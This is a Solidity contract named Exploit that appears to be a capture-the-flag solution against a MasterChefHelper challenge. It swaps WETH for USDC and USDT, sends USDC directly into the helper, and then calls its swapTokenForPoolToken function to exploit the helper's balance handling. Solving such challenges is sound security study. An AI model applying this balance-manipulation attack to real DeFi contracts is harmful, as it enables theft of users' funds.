// SPDX-License-Identifier: GPL-3.0-only

pragma solidity 0.8.16;

import "./Setup.sol";
import "./MasterChefHelper.sol";

contract Exploit {
	
	uint256 private constant _usdcWethPoolIndex = 1;
    ERC20Like public constant usdc = ERC20Like(
		0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
	);
    ERC20Like public constant usdt = ERC20Like(
		0xdAC17F958D2ee523a2206206994597C13D831ec7
	);

	constructor(Setup _setup) payable {
		MasterChefHelper chef = _setup.mcHelper();
		WETH9 weth = _setup.weth();
		UniswapV2RouterLike router = chef.router();
		
		weth.deposit{value: 11.001 ether}();
		weth.approve(address(router), weth.balanceOf(address(this)));
        address[] memory wethUsdtPath = new address[](2);
        wethUsdtPath[0] = address(weth);
        wethUsdtPath[1] = address(usdt);
		router.swapExactTokensForTokens(
			0.001 * (10**18),
			0,
			wethUsdtPath,
			address(this),
			2661017078
		);
        address[] memory wethUsdcPath = new address[](2);
        wethUsdcPath[0] = address(weth);
        wethUsdcPath[1] = address(usdc);
		router.swapExactTokensForTokens(
			1.1 * (10**19),
			0,
			wethUsdcPath,
			address(this),
			2661017078
		);

		usdc.transfer(address(chef), usdc.balanceOf(address(this)));
		usdt.approve(address(chef), usdt.balanceOf(address(this)));
		chef.swapTokenForPoolToken(
			_usdcWethPoolIndex,
			address(usdt),
			usdt.balanceOf(address(this)),
			0
		);
	}
}
